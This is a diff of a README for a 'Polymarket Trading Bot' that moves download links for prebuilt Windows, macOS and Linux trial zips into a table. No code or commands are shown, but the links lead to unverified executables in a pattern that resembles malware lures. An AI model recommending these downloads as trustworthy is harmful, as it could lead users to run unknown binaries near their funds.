@@ -10,19 +10,16 @@ Our plans are built around two core things:
 The main difference between the plans is the level of infrastructure, parameter optimization, automation, support, and strategy access included.
 
 ---
-## 📥 Download Trial
+## 📥 Download Trial Version
 
-### Windows x64
+Try the **Polymarket Trading Bot** on your platform.  
+Choose the build that matches your operating system:
 
-[**⬇️ Download Windows Trial**](https://github.com/user-attachments/files/31364691/Polymarket-Trading-Bot-windows-x64.zip)
-
-### macOS Intel x64
-
-[**⬇️ Download macOS Trial**](https://github.com/nagi777x/Polymarket-Trading-Bot/blob/master/trial/Polymarket-Trading-Bot-macos-x64.zip)
-
-### Linux x64
-
-[**⬇️ Download Linux x64 Trial**](https://github.com/user-attachments/files/31364717/Polymarket-Trading-Bot-linux-x64.zip)
+| Platform | Download |
+|----------|----------|
+| **Windows x64** | [Download Windows Trial](https://github.com/user-attachments/files/31364691/Polymarket-Trading-Bot-windows-x64.zip) |
+| **macOS Intel x64** | [Download macOS Trial](https://github.com/nagi777x/Polymarket-Trading-Bot/blob/master/trial/Polymarket-Trading-Bot-macos-x64.zip) |
+| **Linux x64** | [Download Linux Trial](https://github.com/user-attachments/files/31364717/Polymarket-Trading-Bot-linux-x64.zip) |
 
 ---
 
